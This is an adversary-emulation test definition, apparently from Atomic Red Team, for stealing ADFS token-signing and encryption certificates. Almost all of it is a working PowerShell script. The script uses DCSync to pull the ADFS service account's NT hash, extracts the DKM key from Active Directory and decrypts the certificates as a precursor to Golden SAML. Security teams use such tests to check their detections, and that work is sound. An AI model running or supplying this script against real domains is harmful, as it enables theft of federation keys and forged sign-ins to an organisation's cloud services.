- id: cab413d8-9e4a-4b8d-9b84-c985bd73a442
  name: ADFS token signing and encryption certificates theft - Remote
  description: 'Retrieve ADFS token signing and encrypting certificates. This is a
    precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain
    Administrators user on a domain-joined computer.

    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.'
  tactic: credential-access
  technique:
    attack_id: T1552.004
    name: 'Unsecured Credentials: Private Keys'
  platforms:
    windows:
      psh:
        command: 'Import-Module ActiveDirectory -Force; Import-Module AADInternals
          -Force | Out-Null; #Get Configuration; $dcServerName = (Get-ADDomainController).HostName;
          $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
          name -eq "adfs_svc"; $PWord = ConvertTo-SecureString -String "ReallyStrongPassword"
          -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential
          -ArgumentList Administrator, $PWord; # use DCSync to fetch the ADFS service
          account''s NT hash; $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid
          -Credentials $Credential -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration
          -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com; # Get certificates
          decryption key; $Configuration = [xml]$ADFSConfig; $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group;
          $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName;
          $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn;
          $base = "LDAP://CN=$group,$container,$parent"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base));
          $ADSearch.Filter = ''(name=CryptoPolicy)''; $ADSearch.PropertiesToLoad.Clear();
          $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null; $aduser = $ADSearch.FindOne();
          $keyObjectGuid = $ADUser.Properties["displayName"]; $ADSearch.PropertiesToLoad.Clear();
          $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null; $ADSearch.Filter="(l=$keyObjectGuid)";
          $aduser=$ADSearch.FindOne(); $key=[byte[]]$aduser.Properties["thumbnailphoto"][0];
          # Get encrypted certificates from configuration and decrypt them; Export-AADIntADFSCertificates
          -Configuration $ADFSConfig -Key $key; Get-ChildItem | Where-Object {$_ -like
          "ADFS*"}; Write-Host "`nCertificates retrieved successfully"'
        cleanup: Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore; Remove-Item
          -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - credential-access
  - t1552.004
  author: Atomic Red Team
  additional_info:
    input_arguments:
      adfs_service_account_name:
        description: Name of the ADFS service account
        type: string
        default: adfs_svc
      replication_user:
        description: Username with replication rights. It can be the Domain Admin
          running the script
        type: string
        default: Administrator
      replication_password:
        description: Password of replication_username
        type: string
        default: ReallyStrongPassword
      adfs_server_name:
        description: Name of an ADFS server
        type: string
        default: sts.contoso.com
    dependencies:
    - description: 'AADInternals and ActiveDirectory modules must be installed.

        '
      prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
        -Name ActiveDirectory)) {echo 0} else {echo 1}

        '
      get_prereq_command: 'Install-Module -Name AADInternals -Force

        '
    technique_created: '2020-02-04T13:06:49.258Z'
    atomic_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
    import_timestamp: '2025-08-06T03:44:21.862717Z'
